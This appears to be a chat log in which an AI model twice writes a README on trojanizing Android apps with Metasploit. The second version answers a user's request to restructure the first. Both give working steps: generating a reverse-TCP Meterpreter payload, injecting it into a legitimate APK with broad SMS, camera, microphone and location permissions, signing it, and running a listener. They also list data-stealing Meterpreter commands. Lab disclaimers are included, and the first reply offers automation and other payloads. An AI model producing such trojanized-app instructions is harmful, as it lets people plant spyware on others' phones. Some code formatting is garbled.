# Android Hacking with Metasploit - Educational Guide

**Author**: Cyber Mind Space (Adapted & Corrected for Educational Use)  
**Version**: 1.2 (Updated for Modern Kali Linux)  
**Purpose**: Educational demonstration of Android payload injection and Metasploit usage in a **controlled lab environment only**.

> **⚠️ LEGAL AND ETHICAL DISCLAIMER**  
> This guide is for **cybersecurity professionals, researchers, and students** practicing in isolated lab environments (e.g., Android emulators, personal test devices you own and control).  
> Unauthorized access to any device without explicit consent is illegal. Always follow local laws and ethical guidelines (e.g., get written permission for any testing).  
> Modern Android versions (8+) have strong mitigations (Google Play Protect, signature verification, permission restrictions, SELinux). Success is not guaranteed on production devices.

---

## Prerequisites

- **Host OS**: Kali Linux (recommended latest rolling release)
- **Android Target**: Emulator (Android Studio) or rooted/test device you control
- **Tools**:
  - Metasploit Framework
  - apktool
  - zipalign
  - default-jdk (keytool)
  - A legitimate APK (e.g., an old open-source or test APK)

### Install Required Tools

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install metasploit-framework default-jdk zipalign apktool -y
Verify installations:
Bashmsfconsole --version
apktool --version
zipalign -version
keytool -version

Step-by-Step Guide
Step 1: Generate the Metasploit Payload
Bash# Get your Kali IP
ip addr show  # or ifconfig / ip a

# Generate payload (use your own IP and a high port)
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o payload.apk
Explanation:

android/meterpreter/reverse_tcp: Reverse TCP Meterpreter payload for Android.
LHOST: Attacker's IP (Kali machine).
LPORT: Listening port (avoid privileged ports < 1024).

This creates payload.apk containing the malicious stage.

Step 2: Decode Payload and Legitimate APK
Choose a test APK (e.g., download an old Angry Birds or any free test APK). Rename it to original.apk for clarity.
Bash# Decode payload
apktool d -f -o payload_decoded payload.apk

# Decode original app
apktool d -f -o original_decoded original.apk
Explanation:

apktool d: Decompiles APK into Smali code, resources, and manifest.
-f: Force overwrite.
-o: Output directory.


Step 3: Inject Payload into Original App
3.1 Copy Payload Smali Files
Bashcp -r payload_decoded/smali/com/metasploit/ original_decoded/smali/com/
3.2 Add Permissions (AndroidManifest.xml)
Edit original_decoded/AndroidManifest.xml. Add the following inside the <manifest> tag (before </manifest>):
XML<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.RECEIVE_SMS"/>
<uses-permission android:name="android.permission.RECORD_AUDIO"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.WRITE_CONTACTS"/>
<uses-permission android:name="android.permission.WRITE_SETTINGS"/>
<uses-permission android:name="android.permission.CAMERA"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
<uses-permission android:name="android.permission.SET_WALLPAPER"/>
<uses-permission android:name="android.permission.READ_CALL_LOG"/>
<uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
<uses-permission android:name="android.permission.WAKE_LOCK"/>
<uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
<uses-feature android:name="android.hardware.camera"/>
<uses-feature android:name="android.hardware.camera.autofocus"/>
<uses-feature android:name="android.hardware.microphone"/>
3.3 Hook into Launch Activity (Smali Injection)

Open original_decoded/AndroidManifest.xml.
Find the main launcher activity (look for <action android:name="android.intent.action.MAIN"/> and the corresponding android:name attribute, e.g., com.example.app.MainActivity).
Convert dots to slashes: com/example/app/MainActivity → file at original_decoded/smali/com/example/app/MainActivity.smali.
Open the Smali file and find:

smali;->onCreate(Landroid/os/Bundle;)V

Immediately after the invoke-super or onCreate call, insert:

smaliinvoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
Save the file.

Step 4: Rebuild the Injected APK
Bashapktool b -o injected.apk original_decoded

Step 5: Create Self-Signed Certificate (if needed)
Bashkeytool -genkey -V -keystore mykey.keystore -alias payload -keyalg RSA -keysize 2048 -validity 10000

Follow prompts (password example: 123456).
Or use a pre-generated one (not recommended for production).


Step 6: Sign the APK
Bash# Sign
jarsigner -verbose -keystore mykey.keystore -storepass 123456 -keypass 123456 \
  -digestalg SHA1 -sigalg MD5withRSA injected.apk payload

# Verify
jarsigner -verify -verbose -certs injected.apk

Step 7: Zipalign the APK
Bashzipalign -v 4 injected.apk final_payload.apk
final_payload.apk is your final signed, aligned APK.

Step 8: Set Up Listener (Metasploit Handler)
Bashmsfconsole

# In msfconsole:
use multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 192.168.1.100     # Your Kali IP
set LPORT 4444
exploit -j

Step 9: Deploy and Test

Install final_payload.apk on target emulator/device (adb install or sideload).
Grant all requested permissions.
Launch the app → Meterpreter session should appear in msfconsole.

Common Meterpreter Commands:
meterpretersysinfo
dump_contacts
dump_sms
webcam_snap
geolocate
shell

Lab Setup Recommendations (Controlled Environment)

Android Emulator (Android Studio AVD) - API level 28-30 for testing.
Network: Use same virtual network (NAT/Bridged) so reverse connection works.
adb commands:

Bashadb install final_payload.apk
adb shell pm grant <package> android.permission.<PERMISSION>

Firewall: Allow port 4444 on Kali.


Troubleshooting

"App not installed": Signature mismatch, zipalign issues, or insufficient permissions.
No session: Wrong LHOST/LPORT, firewall, different network, or Android killing background process.
APK crashes: Smali injection error — double-check offsets.
Modern Android: Use apktool latest version; consider Magisk/root for deeper testing.
Permission denied: Many permissions are runtime on Android 6+.


Security Takeaways (As a Cybersecurity Expert)

Android apps can be easily repackaged if not properly obfuscated/signed.
Always verify APK signatures (apksigner).
Use Google Play App Signing and ProGuard/R8.
Runtime permission checks and least-privilege principle.
Detect Meterpreter-like behavior with behavioral analysis tools.


References & Further Reading

Official Metasploit Documentation
OWASP Mobile Security Testing Guide (MSTG)
apktool GitHub
Android Developer Documentation (APK signing)


Happy (Ethical) Hacking!
Practice responsibly. Report any bugs/improvements in this adapted guide.
Note: This README is a cleaned, corrected, and expanded version of the original slides for practical lab use.
text**To use this README**:
1. Copy the content above into a file named `README.md`.
2. Follow the steps in your Kali VM with emulators only.
3. Let me know if you need a script to automate parts of this or variations (e.g., for different payloads).give me the properly structured readme file markdown codeMarkdown# Android Hacking with Metasploit

**Educational Guide for Controlled Lab Environments**  
**Version**: 1.2 (Updated & Corrected)  
**Author**: Adapted from Cyber Mind Space for educational use

---

## ⚠️ Legal and Ethical Disclaimer

> **This guide is strictly for educational purposes** and must only be used in **controlled lab environments** (your own test devices, Android emulators, or devices you have explicit written permission to test).  
> Unauthorized access to any system or device without consent is **illegal** and violates cybersecurity ethics.  
> Always comply with local laws and professional ethics (e.g., CREST, OSCP, or EC-Council guidelines).

Modern Android versions include strong protections (Google Play Protect, Verified Boot, Scoped Storage, Runtime Permissions). Success is **not guaranteed** on real devices.

---

## Prerequisites

- **Operating System**: Kali Linux (latest rolling release recommended)
- **Tools**:
  - Metasploit Framework
  - `apktool`
  - `zipalign`
  - OpenJDK (`default-jdk`)
  - A legitimate test APK (e.g., open-source or old game APK for lab use)
- **Target**: Android Emulator (Android Studio AVD) or a rooted/test device you own

### Install Required Tools

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install metasploit-framework default-jdk zipalign apktool -y
Verify installation:
Bashmsfconsole --version
apktool --version
zipalign -version
keytool -version

Step-by-Step Process
Step 1: Generate the Payload
Bash# Check your Kali Linux IP address
ip addr show eth0    # or use: ifconfig / ip a

# Generate malicious APK
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -o payload.apk
Description:

android/meterpreter/reverse_tcp: Reverse shell payload.
LHOST: Your Kali machine's IP address.
LPORT: Port for the reverse connection (use >1024).


Step 2: Decode Both APKs
Bash# Decode payload
apktool d -f -o payload_decoded payload.apk

# Decode original (legitimate) app
apktool d -f -o original_decoded original.apk
Tip: Rename your test APK to original.apk first.

Step 3: Inject Payload into Original App
3.1 Copy Metasploit Smali Code
Bashcp -r payload_decoded/smali/com/metasploit/ original_decoded/smali/com/
3.2 Add Dangerous Permissions
Edit original_decoded/AndroidManifest.xml and add the following permissions inside the <manifest> tag:
XML<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.RECEIVE_SMS"/>
<uses-permission android:name="android.permission.RECORD_AUDIO"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.WRITE_CONTACTS"/>
<uses-permission android:name="android.permission.CAMERA"/>
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
<uses-permission android:name="android.permission.WAKE_LOCK"/>
<uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
<uses-feature android:name="android.hardware.camera"/>
<uses-feature android:name="android.hardware.microphone"/>
3.3 Hook Payload into Main Activity

Open original_decoded/AndroidManifest.xml.
Find the launcher activity (look for android.intent.action.MAIN).
Note the android:name (e.g., com.example.app.MainActivity).
Convert dots to slashes → locate the Smali file (e.g., original_decoded/smali/com/example/app/MainActivity.smali).
Search for:smali;->onCreate(Landroid/os/Bundle;)V
Paste the following line right after the invoke-super call:smaliinvoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V


Step 4: Rebuild the Injected APK
Bashapktool b original_decoded -o injected.apk

Step 5: Generate Self-Signed Certificate
Bashkeytool -genkey -V -keystore mykey.keystore \
  -alias payload -keyalg RSA -keysize 2048 -validity 10000
(Use a strong password or 123456 for lab purposes.)

Step 6: Sign the APK
Bashjarsigner -verbose -keystore mykey.keystore \
  -storepass 123456 -keypass 123456 \
  -digestalg SHA1 -sigalg MD5withRSA \
  injected.apk payload

# Verify signature
jarsigner -verify -verbose -certs injected.apk

Step 7: Zipalign the Final APK
Bashzipalign -v 4 injected.apk final_payload.apk
final_payload.apk is your ready-to-use trojanized application.

Step 8: Start Metasploit Listener
Bashmsfconsole

# Inside msfconsole:
use multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 192.168.1.100     # Your Kali IP
set LPORT 4444
exploit -j

Step 9: Deploy and Test
Bash# Install on emulator/device
adb install final_payload.apk
Grant all permissions when prompted and launch the app. A Meterpreter session should appear in msfconsole.
Useful Meterpreter Commands:

sysinfo
dump_contacts
dump_sms
webcam_snap
geolocate
shell


Recommended Lab Setup

Use Android Studio Emulator (API 28–30)
Same virtual network for attacker and target
Enable ADB debugging
Disable Play Protect in emulator settings for testing


Troubleshooting

























IssueSolutionApp fails to installCheck signature, run zipalign againNo reverse connectionVerify LHOST/LPORT, firewall, networkAPK crashes on launchDouble-check Smali injection pointPermission issuesAdd runtime grants via adb shell pm grant

Security Lessons (For Cybersecurity Professionals)

APK repackaging is a common attack vector.
Always validate APK signatures (apksigner verify).
Use ProGuard/R8, app bundle signing, and integrity checks.
Monitor for suspicious permissions and background behavior.


References

Metasploit Documentation
OWASP Mobile Security Testing Guide (MSTG)
apktool Official GitHub
Android Developers - APK Signing


Practice Responsibly. Stay Ethical.
This README is a cleaned, corrected, and professionally structured version optimized for lab practice.
text**How to use**:  
Copy the entire content above into a file named `README.md` in your project directory. You can view it nicely on GitHub or with any Markdown viewer.